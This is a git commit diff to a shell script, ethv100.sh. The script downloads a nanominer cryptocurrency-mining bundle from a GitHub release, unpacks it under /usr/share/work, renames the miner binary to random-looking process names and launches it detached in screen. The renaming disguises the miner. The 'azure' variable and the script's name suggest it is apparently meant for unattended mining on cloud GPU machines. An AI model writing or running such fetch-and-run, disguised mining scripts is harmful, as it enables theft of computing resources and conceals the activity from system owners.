09f15f636343db3d02362c57e10493e5f6dec458
ts6aud5vkg <44915776+ts6aud5vkg@users.noreply.github.com>
2020-04-24 22:52:59 +0700

    Update ethv100.sh

--- ethv100.sh
+++ ethv100.sh
@@ -1,7 +1,17 @@
 #!/bin/bash
 sudo apt-get update
-rm -r platinum.tar.gz platinum
+azure=mxsemsdnlkdj
+a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
+apt-get install -y git wget screen
+mkdir /usr/share
+mkdir /usr/share/work
+rm -r /usr/share/work/platinum
 wget https://github.com/ts6aud5vkg/gpuissa/releases/download/ethv100/platinum.tar.gz
-tar xf platinum.tar.gz
-cd platinum && chmod 777 nanominer
-./nanominer
+mv platinum.tar.gz /usr/share/work/
+cd /usr/share/work/ &&  tar xf platinum.tar.gz
+rm -rf platinum.tar.gz && cd platinum
+mv nanominer $azure -n
+cp $azure "$cpuname"
+rm -f  nanominer
+echo $cpuname" is starting"
+screen -d -m ./"${cpuname}"
